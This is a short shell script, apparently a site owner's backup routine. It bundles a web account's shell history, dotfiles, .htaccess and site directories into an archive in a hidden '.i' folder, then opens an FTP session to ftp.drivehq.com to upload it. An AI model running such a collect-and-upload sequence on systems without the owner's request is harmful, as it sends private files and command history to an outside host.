cp -rpf ../cgi-bin  ../cgi-bin_files
echo ""
echo "ls -lAFtr ../cgi-bin_files/cgi-bin/"
ls -lAFtr ../cgi-bin_files/cgi-bin/
tar  -cjf ../.i/g06u33.bz2  ../.bash_history ../.bashrc ../.htaccess ../.viminfo ../.vimrc ../cgi-bin  ../cgi-bin_files ../css ../img ../public_html ../js
cd ../.i
ls -lAFtr
echo ""
echo "!!!  g06  e..  binary   put g06u33.bz2 "
echo ""
ftp ftp.drivehq.com
